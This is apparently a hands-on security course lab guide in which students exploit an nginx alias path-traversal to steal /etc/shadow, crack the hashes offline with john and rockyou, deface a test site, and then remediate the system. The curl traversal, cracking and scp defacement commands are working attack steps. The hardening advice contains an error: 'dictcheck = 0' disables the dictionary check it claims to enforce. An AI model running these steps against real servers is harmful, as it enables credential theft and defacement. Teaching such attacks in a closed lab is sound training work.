---
title: "ShredTheater Studios: Permissions, Traversal, and Password Hygiene"
subtitle: "ShredTheater Studios"
lab: "file-system-permissions"
---

<img src="nps-logo.png" alt="NPS" class="lab-logo" />

# ShredTheater Studios: Permissions, Traversal, and Password Hygiene

<p class="meta">ShredTheater Studios &bull; Lab <code>file-system-permissions</code></p>

## Scenario

A disgruntled administrator sabotaged ShredTheater's web server and file permissions before leaving. An outside attacker exploited it. You must reproduce the attack to understand it, then investigate, remediate, and harden the system.


**Your role:** ShredTheater system administrator (admin1).
**Estimated completion time:** 3 hours

## Learning Objectives

This lab will teach students:

- The Linux file system structure and how permission bits work.
- How a real web-server misconfiguration (an nginx `alias` path traversal) leads to sensitive-file disclosure.
- How stolen password hashes are cracked offline with a wordlist.
- How to manage user accounts, groups, and password policy in Linux.
- How to audit every account's password against a wordlist and remediate weak ones.

## Learning Outcomes

After this lab, students will be able to:

- Explain the Linux file system layout and the meaning of the permission bits.
- Identify and fix an nginx `alias` off-by-slash path-traversal misconfiguration.
- Recognize why world-readable sensitive files (e.g. `/etc/shadow`) are dangerous.
- Crack weak password hashes offline, and audit and remediate weak passwords.
- Implement password-quality requirements with pam_pwquality.

## Background

ShredTheater Studios is a small startup that makes customized guitar parts. As it
grew into online sales it hired two inexperienced system administrators and two
web developers. One administrator (the `admin2` account), expecting to be fired,
quietly opened weaknesses in the system so an outside attacker could cause damage.
Two of his changes matter here: he introduced a **path-traversal misconfiguration**
in the company's nginx web server, and he made **`/etc/shadow` world-readable**.

There are two machines: **target** (the ShredTheater web host, `www.shredtheater.com`)
and **attacker** (a Kali box on the same network).

## The attack

Run every step from the **attacker** machine unless noted.

1. Confirm the site resolves and browse it:

       ping -c1 www.shredtheater.com
       curl -s http://www.shredtheater.com/ | head

2. Exploit the nginx `alias` off-by-slash traversal to read sensitive files. The
   `/assets` location is misconfigured, so appending `../` escapes the web root:

       curl -s "http://www.shredtheater.com/assets../../etc/passwd"
       curl -s "http://www.shredtheater.com/assets../../etc/shadow" -o shadow.stolen

   `/etc/shadow` is readable only because it was left world-readable — the second
   half of the sabotage.

3. Crack the stolen hashes **offline** with the full rockyou wordlist that ships
   with Kali. Do not brute-force SSH online; offline cracking is why hash theft
   is so serious.

       gunzip -k /usr/share/wordlists/rockyou.txt.gz
       john --wordlist=/usr/share/wordlists/rockyou.txt shadow.stolen
       john --show shadow.stolen

   The weak accounts crack. Ubuntu uses the deliberately slow yescrypt hash, so
   this takes a couple of minutes even for common passwords — **wait and watch**.

4. Deface the site. Using a cracked admin account, copy the attacker's page over
   the real one:

       scp index.html admin1@www.shredtheater.com:/web_dev/index.html

   Reload `http://www.shredtheater.com/` and note the flag shown on the page.

## Recovery and remediation

The CEO asks you (as `admin1`, on the **target**) to investigate and fix it.

1. **Close the traversal.** Edit `/etc/nginx/sites-enabled/shredtheater` so the
   location has a trailing slash (`location /assets/ { alias /web_dev/assets/; }`),
   then `sudo systemctl restart nginx`. Re-test the traversal URL — it should 404.

2. **Fix sensitive-file permissions.** Restore `/etc/shadow` to `root:shadow 640`,
   and harden `/web_dev` and its files to least privilege.

3. **Audit every account's password against rockyou and change the weak ones.**
   Weak passwords are still weak even after the breach. Audit the whole system:

       sudo cp /etc/shadow /etc/passwd /tmp/ && cd /tmp
       sudo unshadow passwd shadow > creds
       john --wordlist=/usr/share/wordlists/rockyou.txt creds
       john --show creds

   For **every** account that cracks, set a new strong password with `passwd`.

4. **Enforce password quality.** In `/etc/security/pwquality.conf` set
   `minlen = 10`, `minclass = 2`, and `dictcheck = 0`, so future passwords resist
   this attack.

5. **Expire the developers' passwords** so they must reset at next login:
   `sudo passwd -e dev1` and `sudo passwd -e dev2`.

6. **Restore the website** from the clean backup:
   `sudo cp /web_dev/backup/index.html /web_dev/index.html`.

## Submission

Record your work in the lab report (`~/report-file-system-permissions.md`), with
screenshots of the traversal, the crack, and each remediation step. Run
`checkwork` to self-assess.


## The network

The systems in play for this exercise:

| Host | Address | Role | Login |
|------|---------|------|-------|
| `shredtheater-web` (target) | 172.25.0.3 | webserver | `admin1` |
| `kali-attacker` (attacker) | AUTO | redteam | `attacker` |

Network segments:

| Segment | Subnet | Purpose |
|---------|--------|---------|
| company | `172.25.0.0/24` | ShredTheater corporate LAN |

## Deliverables

Complete the lab report at `~/report-file-system-permissions.md` (on `target`):

- Edit it in **vim**.
- Capture evidence with **`shot`**. Your workstation shares the host display, so
  `shot` captures whatever is on screen (including the browser and terminals this
  lab opens); use `shot -s` to grab just one region or window. Images save under
  `./shots/` and it prints a ready-to-paste `![](…)` line.
- Render and check it with **`preview ~/report-file-system-permissions.md`** (opens in Firefox as HTML + PDF).
- **Hand in:** run **`submit ~/report-file-system-permissions.md`**. It builds a single
  self-contained `report-file-system-permissions.pdf` (all screenshots embedded) and copies it
  to the host dropbox at `labtainer-student/mystuff/`. Upload that one PDF to the LMS.
- When you stop the lab, the full report and its `shots/` images are also collected
  in the `.lab` archive for your instructor.

## Grading

Your work is assessed on these goals:

- Exploited the nginx path traversal to read /etc/passwd and /etc/shadow
- Cracked a weak password offline with rockyou
- Defaced the site, then restored it from backup
- Closed the nginx path traversal (trailing slash on the location)
- Restored least-privilege permissions on /etc/shadow
- Set a password-quality policy (minlen, minclass, dictcheck)
- Changed every weak account password after auditing against rockyou
- Expired the developer passwords

## References

- ShredTheater Studios
- don-range
- file permissions
- path traversal
- password cracking
